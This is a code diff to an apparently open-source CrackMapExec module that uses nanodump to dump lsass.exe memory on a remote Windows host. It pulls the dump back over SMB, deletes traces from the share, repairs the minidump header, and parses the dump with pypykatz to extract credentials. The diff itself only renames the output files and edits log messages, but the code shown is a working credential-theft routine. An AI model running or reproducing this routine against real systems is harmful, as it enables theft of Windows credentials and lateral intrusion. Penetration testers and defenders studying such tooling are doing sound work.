@@ -2,8 +2,10 @@
 # author of the module : github.com/mpgn
 # nanodump: https://github.com/helpsystems/nanodump
 
-from io import StringIO
 import base64
+import sys
+import os
+from datetime import datetime
 from pypykatz.pypykatz import pypykatz
 
 class CMEModule:
@@ -83,8 +85,8 @@ class CMEModule:
         context.log.info('Getting lsass PID {}'.format(command))
         p = connection.execute(command, True)
         pid = p.split(',')[1][1:-1]
-        lower_digits = string.ascii_lowercase + string.digits
-        nano_log_name = ''.join(random.choice(lower_digits) for i in range(10)) + '.log'
+        timestamp = datetime.today().strftime('%Y%m%d_%H%M')
+        nano_log_name = '{}.log'.format(timestamp)
         command = self.tmp_dir + self.nano + ' --pid ' + pid + ' --write ' + self.tmp_dir + nano_log_name
         context.log.info('Executing command {}'.format(command))
         p = connection.execute(command, True)
@@ -97,13 +99,14 @@ class CMEModule:
             context.log.error('Process lsass.exe error on dump, try with verbose')
         
         if dump:
-            context.log.info('Copy {} to host'.format(nano_log_name))
-            with open(self.dir_result + nano_log_name, 'wb+') as dump_file:
+            context.log.info('Copying {} to host'.format(nano_log_name))
+            filename = '{}{}_{}_{}.log'.format(self.dir_result,connection.hostname,connection.os_arch,connection.domain)
+            with open(filename, 'wb+') as dump_file:
                 try:
                     connection.conn.getFile(self.share, self.tmp_share + nano_log_name, dump_file.write)
-                    context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(self.dir_result + nano_log_name))
+                    context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(filename))
                 except Exception as e:
-                    context.log.error('Error while get file: {}'.format(e))
+                    context.log.error('Error while getting file: {}'.format(e))
 
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + self.nano)
@@ -117,7 +120,7 @@ class CMEModule:
             except Exception as e:
                 context.log.error('Error deleting lsass.dmp file on share {}: {}'.format(self.share, e))
 
-            fh = open(self.dir_result + nano_log_name, "r+b")
+            fh = open(filename, "r+b")
             fh.seek(0)
             fh.write(b'\x4d\x44\x4d\x50')
             fh.seek(4)
@@ -126,7 +129,7 @@ class CMEModule:
             fh.write(b'\x00\x00')
             fh.close()         
             
-            with open(self.dir_result + machine_name, 'rb') as dump:
+            with open(filename, 'rb') as dump:
                 try:
                     credentials = []
                     credz_bh = []
